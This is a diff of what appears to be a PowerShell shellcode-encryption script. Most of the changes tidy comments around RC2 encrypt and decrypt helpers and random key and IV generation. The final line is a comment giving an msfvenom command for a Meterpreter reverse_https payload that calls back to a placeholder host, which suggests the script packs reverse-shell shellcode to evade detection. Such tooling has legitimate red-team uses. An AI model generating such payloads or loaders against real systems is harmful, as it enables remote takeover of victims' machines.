@@ -35,12 +35,11 @@ function Format-ByteArrayToHex($Bytes, $VarName) {
 function Encrypt-Bytes($Bytes, $Key, $IV) {
     $RC2 = New-Object System.Security.Cryptography.RC2CryptoServiceProvider
 
-    # 40-bit > 128-bit
+    # 40-bit | 128-bit
     $RC2.KeySize = 128
 
-    # Does not change between 40-bit/128-bit key lengths
+    # Does not change between 40/128-bit key lengths
     $RC2.BlockSize = 64
-    
     $RC2.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $RC2.key = $Key
     $RC2.IV = $IV
@@ -60,20 +59,21 @@ function Decrypt-Bytes($Bytes, $Key, $IV) {
 
     # Keep this in mind when you view your decrypted content as the size will likely be different
     $RC2.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-
     $RC2.key = $Key
     $RC2.IV = $IV
 
     $decryptor = $RC2.CreateDecryptor($RC2.Key, $RC2.IV)
     $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
+
+    # If you keep powershell open this will stay in memory
     $RC2.Dispose()
     return $decrypted
 }
 
-# 5 Bytes > 40-bit | 16 Bytes > 128
+# 5 Bytes > 40-bit | 16 Bytes > 128-bit
 [Byte[]]$Key = Get-RandomBytes -Size 16
 
-# Does not change between 40/128 key lengths
+# Does not change between 40/128-bit key lengths
 [Byte[]]$IV = Get-RandomBytes -Size 8
 
 # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1 -v payload
